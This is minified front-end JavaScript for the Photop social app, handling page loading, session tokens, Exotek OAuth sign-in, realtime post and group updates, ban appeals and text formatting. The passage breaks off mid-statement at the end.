let serverURL="https://photop.exotek.co/",assetURL="https://photop-content.s3.amazonaws.com/",exotekCDN="https://exotekcdn.exotektechnolog.repl.co/";const socket=new SimpleSocket({project_id:"61b9724ea70f1912d5e0eb11",project_token:"client_a05cd40e9f0d2b814249f06fbf97fe0f1d5"});let statuses={0:["Offline","#a4a4a4"],1:["Online","#00FC65"],2:["In Group","#5ab7fa"]},supportedImageTypes=["png","jpeg","jpg","webp","svg+xml","tiff","tif","heic","heif"],months=["January","February","March","April","May","June","July","August","September","October","November","December"],week=["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],roleTypes={Owner:["üëë",{CanDeletePosts:!0,CanDeleteChats:!0,CanBanUsers:!0,CanUnbanUser:!0},"#A88D48"],Admin:["üî®",{CanDeletePosts:!0,CanDeleteChats:!0,CanBanUsers:!0,CanUnbanUser:!0},"#B54242"],Moderator:["üõ°Ô∏è",{CanDeletePosts:!0,CanDeleteChats:!0,CanBanUsers:!0},"#3F6479"],"Trial Moderator":["üõ°Ô∏è",{CanDeletePosts:!0,CanDeleteChats:!0},"#888888","filter: contrast(0) brightness(1.5);"],Developer:["üë®‚Äçüíª",{},"#63A835"],Contributor:["üîß",{},"#697F94"],"Bug Hunter":["üêõ",{},"#849040"],Verified:["üì¢",{},"#A2494F"],Partner:["üì∑",{},"#395568"],Tester:["üß™",{},"#288887"],Bot:["ü§ñ",{},"#8B3945"],Premium:["‚≠ê",{},"#d94abe","background: linear-gradient(315deg, #ec24ae 25%, #d90d9a 50%, #f929b9 50%, #f16dc8 75%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"]},roleKeyTypes=Object.keys(roleTypes),wireframes={},pages={},modules={},convos={},account={},groups={},userID=null,mainLoadActions=[],subscribes=[],body=findC("body"),app=findC("app"),main=findC("main"),pageHolder=findC("pageHolder"),sidebarButtons=findI("sidebarButtons"),isMobile=!1,connectingUI=findI("connectingDisplay");socket.onopen=function(){connectingUI.style.display="none",recentUsers={},init(),""!=currentPage&&refreshPage()},socket.onclose=function(){connectingUI.style.display="flex"};let tempListeners=[];function tempListen(e,t,o,r){e.addEventListener(t,o,r),tempListeners.push({parent:e,name:t,listener:o})}function removeTempListeners(){for(let e=0;e<tempListeners.length;e++){let t=tempListeners[e];null!=t.parent&&t.parent.removeEventListener(t.name,t.listener)}}function copyClipboardText(e){navigator.clipboard.writeText(e).then((function(){}),(function(e){console.error("Async: Could not copy text: ",e)}))}function clipBoardRead(e){e.preventDefault(),document.execCommand("inserttext",!1,e.clipboardData.getData("text/plain"))}function findC(e){return document.getElementsByClassName(e)[0]}function findI(e){return document.getElementById(e)}let currentPage="",currentPageWithSearch=window.location.search,currentlyLoadingPages={};async function setPage(e){let t=currentPage;currentPage=e,app.style.width="850px",t!=e&&(pageHolder.innerHTML=""),removeTempListeners();for(let e=0;e<subscribes.length;e++)subscribes[e].close();if(subscribes=[],null!=window.closeMobileChat&&closeMobileChat(),null==wireframes[e]){if(null!=currentlyLoadingPages[e])return;currentlyLoadingPages[e]="",await loadScript("./pages/"+e+".js"),delete currentlyLoadingPages[e]}if("home"==e&&t==e||(pageHolder.innerHTML=wireframes[e]),null!=pages[e]){window.location.hash="#"+e,await pages[e]();let t=e;t=e.charAt(0).toUpperCase()+e.slice(1),document.title=t+" | Photop"}}async function refreshPage(){pageHolder.innerHTML=wireframes[currentPage]||"",removeTempListeners();for(let e=0;e<subscribes.length;e++)subscribes[e].close();if(subscribes=[],null!=window.closeMobileChat&&closeMobileChat(),null==wireframes[currentPage]){if(null!=currentlyLoadingPages[currentPage])return;currentlyLoadingPages[currentPage]="",await loadScript("./pages/"+currentPage+".js"),delete currentlyLoadingPages[currentPage]}if(null!=pages[currentPage]){window.location.hash="#"+currentPage,await pages[currentPage]();let e=currentPage;e=currentPage.charAt(0).toUpperCase()+currentPage.slice(1),document.title=e+" | Photop"}}function goBack(){history.back()}async function getModule(e){return null==modules[e]&&await loadScript("./modules/"+e+".js"),modules[e]}function createElement(e,t,o,r){if(null==r&&(r=[]),null==o)return null;"string"!=typeof o&&"number"!=typeof o||(o=findC(o));let n=document.createElement(t);null===o?document.body.appendChild(n):o.appendChild(n);let a="",l=Object.keys(r);for(let e=0;e<l.length;e++)a+=l[e]+": "+r[l[e]]+"; ";return n.setAttribute("style",a),n.setAttribute("class",e),n}async function sleep(e){return new Promise((t=>setTimeout(t,e)))}function getScript(e){return document.querySelector("[src='"+e+"'")}async function loadScript(e){return new Promise((function(t){let o=getScript(e);if(o)return void(o.hasAttribute("done")?t(o):o.addEventListener("load",(function(){t(o)})));let r=document.createElement("script");r.addEventListener("load",(function(){r.setAttribute("done",""),t(r)})),r.src=e,document.body.appendChild(r)}))}function getParam(e){let t=window.location.search;return new URLSearchParams(t).get(e)}function modifyParams(e,t){const o=new URL(window.location);null!=t?o.searchParams.set(e,t):o.searchParams.delete(e),window.history.pushState({},"",o)}window.addEventListener("hashchange",(function(){let e=window.location.hash.substring(1);currentPage!=e.replace(/\./g,"")&&("."!=e[e.length-1]?setPage(e):history.back())}));let localDataStore={};function setLocalStore(e,t){localDataStore[e]=t;try{localStorage.setItem(e,t)}catch{}}function getLocalStore(e){let t=localDataStore[e];try{t=localStorage.getItem(e)}catch{}return t}function removeLocalStore(e){localDataStore[e]&&delete localDataStore[e];try{localStorage.removeItem(e)}catch{}}let epochOffset=0;function getEpoch(){return Date.now()+epochOffset}async function renewToken(){let e=getLocalStore("token");if(null==e)return;let t=userID||getLocalStore("userID"),o=await fetch(serverURL+"auth/renew",{method:"POST",headers:{cache:"no-cache","Content-Type":"text/plain"},body:JSON.stringify({userid:t,refresh:JSON.parse(e).refresh})});if(200==o.status){let e=JSON.parse(await o.text());return setLocalStore("token",JSON.stringify(e.token)),account.Realtime=e.realtime,e.token}[404,401].includes(o.status)&&(removeLocalStore("userID"),removeLocalStore("token"),location.reload())}let accountSubscribe,sentFirstReq=!1;async function sendRequest(e,t,o,r){if(1==account.banned&&"mod/appeal"!=t)return[0,"Account Banned"];let n=sentFirstReq;sentFirstReq=!0;try{let n={method:e,headers:{cache:"no-cache"}};1!=r&&(n.headers["Content-Type"]="text/plain"),null!=o&&("object"==typeof o&&o instanceof FormData==0&&(o=JSON.stringify(o)),n.body=o);let a=getLocalStore("token");if(null!=a){a=JSON.parse(a),a.expires<Math.floor(getEpoch()/1e3)&&(a=await renewToken()||a);let e=userID||getLocalStore("userID");null!=e&&(n.headers.auth=e+";"+a.session)}let l=await fetch(serverURL+t,n);if(1==l.headers.has("date")){let e=new Date(l.headers.get("date")).getTime(),t=(new Date).getTime();epochOffset=e-t}switch(l.status){case 401:await renewToken();break;case 429:(await getModule("modal"))("Rate Limited",await l.text(),[["Okay","var(--grayColor)"]]);break;case 418:account.banned=!0;let e=JSON.parse(await l.text());(await getModule("modal"))("Account Banned",`Oh no! It appears you have broken a Photop rule resulting in your account being banned.<br><br><b>Account:</b> ${e.account}<br><b>Reason:</b> ${e.reason}<br><b>Expires:</b> ${"Permanent"==e.expires?"Permanent":formatFullDate(1e3*e.expires)}${1==e.terminated?"<br><b>Terminated:</b> Yes":""}${e.appealed?"":'<br><div id="banAppealInput" contenteditable class="textArea" placeholder="Appeal your Ban"></div><button id="submitAppealButton">Submit</button>'}`);let t=findI("submitAppealButton");null!=t&&t.addEventListener("click",(async function(){let e=findI("banAppealInput");if(e.textContent.length<1)return void(await getModule("modal"))("Write an Appeal","You must write an appeal before submitting it.",[["Okay","var(--grayColor)"]]);let[o]=await sendRequest("POST","mod/appeal",{appeal:e.textContent.substring(0,250)});200==o&&(e.remove(),t.remove(),(await getModule("modal"))("Appeal Sent","We've recieved your appeal and will review it as soon as possible.",[["Okay","var(--grayColor)"]]))}));break;default:return[l.status,await l.text()]}return[0,"Request Refused"]}catch(e){return 0==n&&(findI("backBlur"+(await getModule("modal"))("Error Reaching Server","All no! We encountered an error sending your request through the pipes of the internet. Please try again later.",[["Retry","var(--themeColor)",function(){location.reload()}]])).style.zIndex=999999),console.log("FETCH ERROR: "+e),[0,"Fetch Error"]}}function getObject(e,t){if(null==e)return{};let o={};for(let r=0;r<e.length;r++){let n=e[r];o[n[t]]=n}return o}let recentUserPostID,setLocation,postUpdate,newPostCount=0;function fetchNewPosts(e){null!=e&&e.GroupID!=getParam("group")||("group"!=currentPage?setPage("home"):null!=window.refreshPostsFunction?window.refreshPostsFunction():setPage("group"))}function setAccountSub(e){setLocation=e||setLocation;let t={task:"general",location:setLocation};null!=userID&&(t.userID=userID,t.token=account.Realtime,t.groups=Object.keys(groups),account.Type&&(t.location+=account.Type)),null!=accountSubscribe?accountSubscribe.edit(t):accountSubscribe=socket.subscribe(t,(async function(e){if(null!=e.realtime)return account.Realtime=e.realtime,setAccountSub(),void updateProfileSub();switch(e.type){case"newpost":if(e.post.UserID==userID)return void(recentUserPostID!=e.post._id&&(recentUserPostID=e.post._id,fetchNewPosts(e.post)));if(null!=account.BlockedUsers&&1==account.BlockedUsers.includes(e.post.UserID))return;if(null!=e.post.GroupID){if(null==findI(e.post.GroupID+"notif")){(await getModule("groupnotif"))({...groups[e.post.GroupID],_id:e.post.GroupID})}if("group"!=currentPage||getParam("group")!=e.post.GroupID)return}else if("home"!=currentPage)return;let t=findC("postHolder");if(null==t)return;if(null!=t.firstChild&&null!=t.firstChild.getAttribute("time")&&parseInt(t.firstChild.getAttribute("time"))>=e.post.Timestamp)return;let o=findI("refreshPosts");null==o&&(o=createElement("stickyContainer","div",t),o.id="refreshPosts",newPostCount=0),"group"==currentPage&&(o.style.top="62px"),null!=t.firstChild&&t.insertBefore(o,t.firstChild),newPostCount+=1;let r="";newPostCount>1&&(r="s"),o.innerHTML="Show <b>"+newPostCount+"</b> Post"+r,tempListen(o,"click",(function(){fetchNewPosts()}));break;case"checked":let n=groups[e._id];if(null==n)return;n.LastChecked=e.seen;let a=findI(e._id+"notif");null!=a&&a.remove();break;case"join":groups[e.data._id]=e.data;let l=findC("groupsHolder-groups");if(null!=l){let t=createElement("groupSection","div",pageHolder);t.innerHTML=`${null!=e.data.Icon?`<img src="${assetURL}GroupImages/${e.data.Icon}" class="groupIcon">`:""}<div class="groupInfo"><div class="groupName">${e.data.Name}</div></div>`,t.id=e.data._id,t.setAttribute("type","viewgroup"),null!=l.firstChild&&l.insertBefore(t,l.firstChild)}setAccountSub();break;case"group":let s=groups[e.data._id];if(null==s)return;let i=Object.keys(e.data);for(let t=0;t<i.length;t++){let o=i[t];s[o]=e.data[o]}"group"==currentPage&&getParam("group")==e.data._id&&refreshPage();break;case"leave":null!=groups[e.groupID]&&delete groups[e.groupID];let c=findI(e.groupID);null!=c&&c.remove(),"group"==currentPage&&getParam("group")==e.groupID&&setPage("groups"),setAccountSub()}}))}function setPostUpdateSub(){let e=[],t=document.getElementsByClassName("post");for(let o=0;o<t.length;o++)e.push(t[o].id);let o={task:"post",_id:e};null!=postUpdate?postUpdate.edit(o):postUpdate=socket.subscribe(o,(function(e){let t=findI(e._id);if(null!=t)switch(e.type){case"chatting":let o=t.querySelector(".postChatChatting");o&&changeCounter(o.querySelector("span"),e.chatting);break;case"like":let r=t.querySelector(".postButton[type='like']"),n=findI("likes"+t.id);if(e.userID==userID){let t=r.querySelector("svg").querySelector("path");if(1==e.change){if(1==r.hasAttribute("isLiked"))return;r.setAttribute("isLiked","true"),r.parentElement.style.color="#FF5786",t.setAttribute("fill","#FF5786"),t.setAttribute("stroke","#FF5786")}else if(-1==e.change){if(0==r.hasAttribute("isLiked"))return;r.removeAttribute("isLiked"),r.parentElement.style.removeProperty("color"),t.removeAttribute("fill"),t.setAttribute("stroke","#999")}}changeCounter(n,parseInt(n.getAttribute("realnum"),10)+e.change);break;case"delete":"100%"==t.style.height&&null!=window.closeMobileChat&&closeMobileChat(),t.remove();break;case"edit":t.style.opacity="1",t.setAttribute("text",e.text);const a=t.querySelector(".postPost"),l=a.querySelector(".postContent").querySelector(".postText"),s=a.querySelector(".postUser").querySelector(".postInfo").querySelector(".postTimestamp");l.innerHTML=formatText(e.text),s.innerHTML=`${timeSince(t.getAttribute("time"),!0)} <span title="${formatFullDate(e.edited)}">(edited)</span>`}}))}function decideProfilePic(e){let t="DefaultProfilePic";return null!=e&&null!=e.Settings&&null!=e.Settings.ProfilePic&&(t=e.Settings.ProfilePic),assetURL+"ProfileImages/"+t}function changeCounter(e,t){let o=e,r=parseInt(o.getAttribute("realnum"),10);t=parseInt(t,10),o.setAttribute("realnum",t),o.setAttribute("title",t.toLocaleString()),abbr(r)!=t&&(o.innerHTML=r<t?abbr(r)+"<br>"+abbr(t):abbr(t)+"<br>"+abbr(r),o.style.marginTop=r<t?"0":"-15px",setTimeout((function(){o.style.transition="0.2s",o.style.marginTop=r<t?"-15px":"0",setTimeout((function(){o.innerHTML=abbr(t),o.style.transition="0s",setTimeout((function(){o.style.marginTop="0"}),16)}),200)}),16))}async function auth(){let[e,t]=await sendRequest("GET","me?ss="+socket.secureID);200==e&&updateToSignedIn(t)}async function loadNeededModules(){window.showPopUp=await getModule("modal"),window.webModal=await getModule("webmodal"),window.showDropdown=await getModule("dropdown"),window.showPreview=await getModule("profilepreview")}findI("logoutB").addEventListener("click",(function(){showPopUp("Are You Sure?","Are you sure you want to log out?",[["Logout","var(--themeColor)",async function(){let e=getLocalStore("token");if(null==e)return;let[t,o]=await sendRequest("POST","auth/logout",{refresh:JSON.parse(e).refresh});200==t&&(removeLocalStore("userID"),removeLocalStore("token"),location.reload())}],["Cancel","var(--grayColor)"]])}));let alreadyInit=!1;async function init(){if(loadNeededModules(),getParam("code")&&(await loadNeededModules(),await handleOAuthEvents(getParam("code"),getParam("state")),modifyParams("code"),modifyParams("state")),null!=getLocalStore("token")&&await auth(),1==alreadyInit)return updateProfileSub(),void setAccountSub();if(alreadyInit=!0,await loadNeededModules(),null!=getParam("connect")&&null==userID&&openLoginModal("signin","Sign In"),null!=getParam("gift")&&null==userID&&openLoginModal("signin","Sign In"),null!=userID)""==currentPage&&(null!=getParam("group")?setPage("group"):null!=getParam("post")?showPost(getParam("post")):null!=getParam("chat")?showChat(null,getParam("chat")):null!=getParam("user")?setPage("profile"):null!=getParam("j")?setPage("group"):""==window.location.hash?setPage("home"):setPage(window.location.hash.substring(1))),updateProfileSub(),setAccountSub("home"),null!=account.Settings&&null!=account.Settings.Display&&setLocalStore("display",JSON.stringify(account.Settings.Display));else{let e=sidebarButtons.children;for(let t=0;t<e.length;t++)"Home"!=e[t].innerText&&e[t].classList.add("hidden");null!=getParam("post")?showPost(getParam("post")):null!=getParam("chat")?showChat(null,getParam("chat")):null!=getParam("user")?setPage("profile"):null!=getParam("j")||null!=getParam("group")?setPage("group"):"#migrate"==window.location.hash?setPage("migrate"):"#tos"==window.location.hash?setPage("tos"):setPage("home");let t=createElement("stickyContainer","div",main);t.id="signInUpBar",t.innerHTML='\n    <span class="signInUpText">Ready to Join the Hangout?</span>\n    <button class="signUpButton">\n      Sign Up\n    </button>\n    <button class="signInButton">\n      Sign In\n    </button>\n    ',findC("signUpButton").addEventListener("click",(function(){openLoginModal("signup","Create Account")})),findC("signInButton").addEventListener("click",(function(){let e=showPopUp("Sign In",'<button class="exotekLoginBtn" id="exotekLoginBtn"><image src="https://exotek.co/images/favicon.png" class="btnImg"><div style="flex: 1">Exotek</div></button><div style="text-align: center"><br>Have an old Photop account?<br><a href="#migrate" target="_blank">Migrate Account</a></div>',[["Cancel","var(--grayColor)"]]);findI("exotekLoginBtn").addEventListener("click",(function(){openLoginModal("signin","Sign In"),findI("backBlur"+e).style.opacity=0,findI("backBlur"+e).children[0].style.transform="scale(0.9)",setTimeout((function(){findI("backBlur"+e).remove()}),199)}))})),null!=findC("pageHolder")&&main.insertBefore(t,findC("pageHolder"))}(await getModule("actions"))()}function randomString(e){for(var t,o="";o.length<e;)o+=(t=void 0,(t=Math.floor(62*Math.random()))<10?t:t<36?String.fromCharCode(t+55):String.fromCharCode(t+61));return o}async function openLoginModal(e,t){let o=randomString(20);setLocalStore("state",o),window.loginWindow=(await getModule("webmodal"))("https://exotek.co/login?client_id=62f8fac716d8eb8d2f6562ef&redirect_uri="+encodeURIComponent(window.location.href)+"&response_type=code&scope=userinfo&state="+o+"#"+e,t)}async function handleOAuthEvents(e,t){if(null!=e&&null!=t)if(20==t.length){if(t!=getLocalStore("state"))return;removeLocalStore("state");let[o,r]=await sendRequest("POST","auth?ss="+socket.secureID,{code:e});200==o?updateToSignedIn(r):showPopUp("An Error Occured",r,[["Okay","var(--grayColor)"]])}else if("transferlogin"==t)window.transferLoginCode=e,showPopUp("Complete Transfer","To complete the process, login to the new Exotek account you wish to use when signing in.",[["Authenticate","var(--themeColor)",async function(){window.loginWindow=(await getModule("webmodal"))("https://exotek.co/login?client_id=62f8fac716d8eb8d2f6562ef&redirect_uri="+encodeURIComponent(window.location.href)+"&response_type=code&scope=userinfo&state=transferfinish","Transfer Exotek Account (New Account)")}],["Cancel","var(--grayColor)"]]);else if("transferfinish"==t&&window.transferLoginCode){let[t,o]=await sendRequest("POST","auth/transfer",{old:window.transferLoginCode,new:e});if(200==t){let e=JSON.parse(o);account.Email=e.Email,account.Exotek=e.Exotek,account.Premium=e.Premium,refreshPage(),showPopUp("Trasfered Accounts","You will now use your Exotek account:</br><b>"+account.Exotek.user+"</b> <i>("+account.Email+")</i></br>when logging into Photop.",[["Okay","var(--grayColor)"]])}else showPopUp("An Error Occured",o,[["Okay","var(--grayColor)"]]);delete window.transferLoginCode}}function hasPremium(){return null!=account.Premium&&Math.floor(getEpoch()/1e3)<account.Premium.Expires?(supportedImageTypes.includes("gif")||supportedImageTypes.push("gif"),!0):(supportedImageTypes.includes("gif")&&supportedImageTypes.splice(supportedImageTypes.indexOf("gif"),1),!1)}async function updateToSignedIn(e){let t=JSON.parse(e);if(account=t.user,groups=t.groups||{},userID=account._id,await loadNeededModules(),account.Onboarding){let e=showPopUp("Complete Sign Up",`<span class="settingsTitle">Profile Picture</span><div class="groupIconCreate" id="exotekPfpHolder">\n          <img class="groupIconCreateHolder" src="${account.Exotek.image||assetURL+"ProfileImages/DefaultProfilePic"}" id="exotekPfp">\n          <div class="settingsUploadButton"></div>\n        </div><input id="inputOnboardPfp" type="file" accept="image/*" hidden="true"><span class="settingsTitle">Username</span><input type="text" placeholder="Username" class="settingsInput" id="inputName" value="${account.Exotek.user||""}">`,[["Sign Up","var(--signUpColor)",async function(){let o=new FormData;if(o.append("user",findI("inputName").value),o.append("auth",userID+";"+t.token.session),null!=getParam("affiliate")&&o.append("affiliate",getParam("affiliate")),findI("inputOnboardPfp").files.length>0){let e=findI("exotekPfp").src;await fetch(e).then((async function(t){o.append("image",await t.blob()),URL.revokeObjectURL(e)}))}let[r,n]=await sendRequest("POST","auth/signup",o,!0);if(200==r){let o=JSON.parse(n);delete t.user.Onboarding,delete t.user.OnboardExpires,t.user.AccountID=t.user.AwaitAccountID,delete t.user.AwaitAccountID,t.user.User=o.User,o.ProfilePic&&(t.user.Settings=t.user.Settings||{},t.user.Settings.ProfilePic=o.ProfilePic),updateToSignedIn(JSON.stringify(t)),findI("backBlur"+e).style.opacity=0,findI("backBlur"+e).children[0].style.transform="scale(0.9)",setTimeout((function(){findI("backBlur"+e).remove()}),200)}else showPopUp("An Error Occured",n,[["Okay","var(--grayColor)"]])},!0],["Cancel","var(--grayColor)"]]);return tempListen(findI("exotekPfpHolder"),"click",(function(){findI("inputOnboardPfp").click()})),null!=account.Exotek.image&&(findI("exotekPfp").style.display="unset"),void tempListen(findI("inputOnboardPfp"),"change",(function(e){let t=findI("exotekPfp"),o=e.target.files[0];if("image/"==o.type.substring(0,6))if(1==supportedImageTypes.includes(o.type.replace(/image\//g,""))){let e=hasPremium();if(o.size<2097153||o.size<4194306&&e){null!=t.src&&URL.revokeObjectURL(t.src);let e=URL.createObjectURL(o);t.src=e,t.style.display="unset"}else o.size>2097153&&!e?showPopUp("Too big!","Your image must be under 2MB.",[["Okay","var(--grayColor)"]]):o.size>4194306&&e&&showPopUp("Too big!","Your image file size must be under 4MB.",[["Okay","var(--grayColor)"]])}else showPopUp("Invalid Image Type","Photop only accepts images of the following types: <i style='color: #bbb'>"+supportedImageTypes.join(", ")+"</i>",[["Okay","var(--grayColor)"]]);else showPopUp("Must be an Image","Only image files can be uploaded to Photop.",[["Okay","var(--grayColor)"]])}))}if(t.token&&t.user){setLocalStore("userID",t.user._id),setLocalStore("token",JSON.stringify(t.token));let e=sidebarButtons.children;for(let t=0;t<e.length;t++)e[t].classList.remove("hidden");updateProfileSub(),setAccountSub("home");let o=findI("signInUpBar");null!=o&&o.remove(),null!=t.affiliate&&showPopUp("Following "+t.affiliate.user,`Welcome to Photop! You joined with <span type="user" userid="${t.affiliate._id}" class="mention" tabindex="0">@${t.affiliate.user}</span>'s invite link and are now following them!`,[["Cool!","var(--themeColor)"],["Unfollow","#FF5C5C",function(){sendRequest("DELETE","user/unfollow?userid="+t.affiliate._id)}]])}findC("accountInfoPic").src=decideProfilePic(account),findC("accountInfoName").textContent=account.User,findI("accountInfo").style.display="flex",account.Settings=account.Settings||{},account.Settings.Display=account.Settings.Display||{},account.Settings.Display.Theme=account.Settings.Display.Theme||"Dark",updateDisplay(account.Settings.Display.Theme),updateBackdrop(account.Settings.Backdrop),setLocalStore("display",JSON.stringify(account.Settings.Display)),setLocalStore("backdrop",account.Settings.Backdrop),null!=t.restored&&showPopUp("Account Restored!","Your Photop account has been restored. <b>Welcome Back!</b>",[["Okay","var(--grayColor)"]]),findC("sidebarNotifHolder").innerHTML="";let o=await getModule("groupnotif"),r=Object.keys(groups);for(let e=0;e<r.length;e++){let t=groups[r[e]];t.LastChecked<t.LastContent&&o({...t,_id:r[e]})}null!=getParam("gift")&&((await getModule("gift"))(getParam("gift")),modifyParams("gift")),null==getParam("connect")?refreshPage():"settings"!=currentPage&&setPage("settings")}function timeSince(e,t){let o=Math.floor((Date.now()-e)/1e3);o<1&&(o=1);let r=1,n=t?"Second":"s";o>31535999?(r=31536e3,n=t?"Year":"y"):o>2591999?(r=2592e3,n=t?"Month":"mo"):o>604799?(r=604800,n=t?"Week":"w"):o>86399?(r=86400,n=t?"Day":"d"):o>3599?(r=3600,n=t?"Hour":"h"):o>59&&(r=60,n=t?"Minute":"m");let a=Math.floor(o/r);return a>1&&t&&(n+="s"),1==t?a+" "+n+" Ago":a+n}window.addEventListener("message",(async e=>{if("oauth_embed_integration"==e.data)e.source.postMessage("subscribe_oauth_finish","*");else if("https://exotek.co"===e.origin){let t=JSON.parse(e.data);"oauth_finish"==t.type&&(window.loginWindow.close(),handleOAuthEvents(t.code,t.state))}})),null!=getParam("affiliate")&&null==getLocalStore("userID")&&sendRequest("POST","analytics/affiliate",{type:"click",userid:getParam("affiliate")}),sidebarButtons.addEventListener("click",(function(e){let t=(e.path||e.composedPath&&e.composedPath())[0].closest(".sidebarButton");null!=t&&("Post"==t.innerText?("home"!=currentPage&&setPage("home"),findI("newPostArea").focus()):("Profile"==t.innerText&&modifyParams("user",userID),setPage(t.innerText.toLowerCase())))}));let bb=function(e){let t=this,o=/{[A-Z_]+[0-9]*}/gi,r={URL:"(((http|https)://)(www.)?[a-zA-Z0-9@:%._\\+~#?&//=]{2,256}\\.[a-z]{2,6}\\b([-a-zA-Z0-9@:%._\\+~#?&//=]*))",TEXT:"(.*?)",SIMPLETEXT:"[a-zA-Z0-9-_ ]\b",HEX:"([0-9abcdef]+)",PREM:"([a-z0-9]+)"},n=[],a=[],l=[],s=[],i=function(e){let t=e.match(o),n=t.length,a=0,l="";if(n<=0)return new RegExp(u(e),"g");for(;a<n;a+=1){let o=t[a].replace(/[{}0-9]/g,"");r[o]&&(l+=u(e.substr(0,e.indexOf(t[a])))+r[o],e=e.substr(e.indexOf(t[a])+t[a].length))}return l+=u(e),new RegExp(l,"gi")},c=function(e){let t=e.match(o),n=t.length,a=0,l="",s={},i=0;if(n<=0)return e;for(;a<n;a+=1){let o,n=t[a].replace(/[{}0-9]/g,"");s[t[a]]?o=s[t[a]]:(i+=1,o=i,s[t[a]]=o),r[n]&&(l+=e.substr(0,e.indexOf(t[a]))+"$"+o,e=e.substr(e.indexOf(t[a])+t[a].length))}return l+=e,l};function u(e,t){return(e+"").replace(new RegExp("[.\\\\+*?\\[\\^\\]$(){}=!<>|:\\"+(t||"")+"-]","g"),"\\$&")}t.ad=function(e,t){n.push(i(e)),a.push(c(t)),l.push(i(t)),s.push(c(e))},t.bbh=function(e){let t=n.length,o=0;for(;o<t;o+=1)e=e.replace(n[o],a[o]);return e},t.ad("(!{TEXT})","<b>{TEXT}</b>"),t.ad("(*{TEXT})","<i>{TEXT}</i>"),t.ad("(_{TEXT})","<u>{TEXT}</u>"),t.ad("(-{TEXT})","<strike>{TEXT}</strike>"),t.ad("(`{TEXT})",'<span style="font-family:monospace;border-radius:5px;padding:0 5px;background-color:var(--pageColor);">{TEXT}</span>'),t.ad("(^{TEXT})","<sup>{TEXT}</sup>"),t.ad("https://app.photop.live/?gift={PREM}",'<span type="giftlink" giftid="{PREM}" class="gift-link" tabindex="0">Claim Gift!</span>'),t.ad("{URL}",'<a href="{URL}" target="_blank" class="link" title="{URL}">{URL}</a>'),t.ad('@{HEX}"{TEXT}" ','<span type="user" userid="{HEX}" class="mention" tabindex="0">@{TEXT}</span> '),t.ad('@{HEX}"{TEXT}"\n','<span type="user" userid="{HEX}" class="mention" tabindex="0">@{TEXT}</span>\n'),t.ad("/Post_{HEX} ",'<span type="postlink" postid="{HEX}" class="post-embed" tabindex="0">/Post_{HEX}</span> '),t.ad("/Post_{HEX}\n",'<span type="postlink" postid="{HEX}" class="post-embed" tabindex="0">/Post_{HEX}</span>\n'),t.ad("/Chat_{HEX} ",'<span type="chatlink" chatid="{HEX}" class="chat-embed" tabindex="0">/Chat_{HEX}</span> '),t.ad("/Chat_{HEX}\n",'<span type="chatlink" chatid="{HEX}" class="chat-embed" tabindex="0">/Chat_{HEX}</span>\n'),t.ad("/Gift_{PREM} ",'<span type="giftlink" giftid="{PREM}" class="gift-link" tabindex="0">Claim Gift!</span> '),t.ad("/Gift_{PREM}\n",'<span type="giftlink" giftid="{PREM}" class="gift-link" tabindex="0">Claim Gift!</span>\n')},fe=new bb(!1),newPostRender=new bb(!0);function formatText(e){let t=fe.bbh(cleanString(e)+"\n) ");return t=1==t.endsWith(") ")?t.substring(0,t.length-3):t.substring(0,t.length-2),t}function cleanString(e){return e.replace(/\>/g,"&#62;").replace(/\</g,"&#60;")}let formating={"http://":'<span type="link" class="link">{TEXT}</span>',"https://":'<span type="link" class="link">{TEXT}</span>',"www.":'<span type="link" class="link">{TEXT}</span>',"@":'<span type="mention" class="mention">{TEXT}</span>',"/Post_":'<span type="post" class="post-embed">{TEXT}</span>',"/Chat_":'<span type="chat" class="chat-embed">{TEXT}</span>',"/User_":'<span type="user" class="user-embed">{TEXT}</span>',"/Gift_":'<span type="gift" class="gift-embed">{TEXT}</span>',"(!":"<b>{TEXT}</b>","(*":"<i>{TEXT}</i>","(_":"<u>{TEXT}</u>","(-":"<strike>{TEXT}</strike>","(`":'<span style="font-family:monospace;border-radius:5px;padding:0 5px;background-color:var(--pageColor);">{TEXT}</span>',"(^":"<sup>{TEXT}</sup>"},formatingKeys=Object.keys(formating);function postCreateFormat(e){let t=!1;for(let o=0;o<formatingKeys.length;o++){let r=formatingKeys[o],n=-1;for(;n=e.indexOf(r,n),">"==e[n-1];)n+=1;if(n>-1){t=!0;let o=e.length-1,a=e.indexOf(")",n);if(a>-1&&a<o&&(o=a),"("!=r[0]){let t=e.indexOf(" ",n);t>-1&&t<o&&(o=t),t=e.indexOf("¬†",n),t>-1&&t<o&&(o=t)}else o++;let l=formating[r].replace(/{TEXT}/g,e.substring(n,o));e=e.substring(0,n)+l+e.substring(o)}}return 1==t?postCreateFormat(e):e.replace(/\n/g,"</br>")}function preFormat(e){let t=postCreateFormat(cleanString(e)+" ");return t.substring(0,t.length-1)}function createRange(e,t,o){if(o||((o=document.createRange()).selectNode(e),o.setStart(e,0)),0===t.count)o.setEnd(e,t.count);else if(e&&t.count>0)if(e.nodeType===Node.TEXT_NODE)e.textContent.length<t.count?t.count-=e.textContent.length:(o.setEnd(e,t.count),t.count=0);else for(let r=0;r<e.childNodes.length&&(o=createRange(e.childNodes[r],t,o),0!==t.count);r++);return o}function setCurrentCursorPosition(e,t){let o=window.getSelection(),r=null;r="END"==t?createRange(e.lastChild):createRange(e,{count:t}),null!=r&&(r.collapse(!1),o.removeAllRanges(),o.addRange(r))}function getCurrentCursorPosition(e){let t=0;if(void 0!==window.getSelection){if(0!==window.getSelection().rangeCount){const o=window.getSelection().getRangeAt(0),r=o.cloneRange();r.selectNodeContents(e),r.setEnd(o.endContainer,o.endOffset),t=r.toString().length,""==r.endContainer.textContent&&(t="END")}}return t}async function showPost(e,t){null==e&&showPopUp("Post Not Found","That post wasn't found! It may have been removed or never sent at all.",[["Okay","var(--grayColor)"]]);let o=findI(e);if(null==o){let o=e;null!=t&&(o+=","+t.toString()),modifyParams("post",o),await setPage("viewpost")}else 1!=t&&(o.style.backgroundColor="#C95EFF"),o.scrollIntoView(),setPostUpdateSub(),setupPostChats(),await sleep(1e3),o.style.backgroundColor=""}let includePremiumEmbedCode,premiumSubscribe,activePostListeners={};async function showChat(e,t){function o(e){let o=findI(t);return null!=o&&(async function(e,t){e.style.backgroundColor="#2AF5B5";let o={top:e.offsetTop-42};1!=t&&(o.behavior="smooth"),e.parentElement.parentElement.scrollTo(o),await sleep(1e3),e.style.backgroundColor=""}(o,e),!0)}if(null==t&&showPopUp("Chat Not Found","That chat wasn't found! It may have been removed or never sent at all.",[["Back","var(--grayColor)"]]),1==o())return;let r=await 